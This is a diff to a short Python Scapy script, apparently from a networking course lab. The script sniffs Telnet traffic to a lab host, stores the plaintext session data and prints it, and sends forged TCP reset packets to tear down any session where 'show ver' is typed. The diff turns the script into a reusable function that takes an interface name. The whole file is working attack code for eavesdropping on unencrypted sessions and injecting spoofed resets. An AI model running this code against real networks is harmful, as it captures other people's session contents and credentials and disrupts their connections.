@@ -11,6 +11,7 @@ import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # 清除报错
 import re
 from scapy.all import *
+from Part1_Classic_Protocols.Tools.Scapy_IFACE import scapy_iface
 
 qyt_string = b''
 
@@ -32,10 +33,10 @@ def reset_tcp(pkt):
                                                                                                  sport=destination_port,
                                                                                                  flags=4, seq=ack_sn)
     sendp(a,
-          # iface='ens33',
+          iface=global_if,
           verbose=False)
     sendp(b,
-          # iface='ens33',
+          iface=global_if,
           verbose=False)
 
 
@@ -45,19 +46,24 @@ def telnet_monitor_callback(pkt):
         if pkt.getlayer(TCP).fields['dport'] == 23:
             if pkt.getlayer(Raw).fields['load'].decode():
                 qyt_string = qyt_string + pkt.getlayer(Raw).fields['load']  # 不断提取数据,拼接到qyt_string
-    except Exception as e:
-        #	#print(e)
+    except:
         pass
-    # print(qyt_string)
 
     if re.match(b'(.*\r\n.*)*sh.*\s+ver.*', qyt_string):  # 如果出现show ver字段,就Rest踢掉此会话
         reset_tcp(pkt)
+        
+
+def telnet_rst(user_filter, ifname):
+    global global_if
+    global_if = scapy_iface(ifname)
+    PTKS = sniff(prn=telnet_monitor_callback,
+                 filter=user_filter,
+                 store=1,
+                 iface=global_if,
+                 timeout=10)
+    wrpcap("temp.cap", PTKS)
+    print(qyt_string)
 
 
-PTKS = sniff(prn=telnet_monitor_callback,
-             filter="tcp port 23 and ip host 10.1.1.253",
-             store=1,
-             # iface='ens33',
-             timeout=15)
-wrpcap("temp.cap", PTKS)
-print(qyt_string)
+if __name__ == "__main__":
+    telnet_rst("tcp port 23 and ip host 10.1.1.253", "ens33")
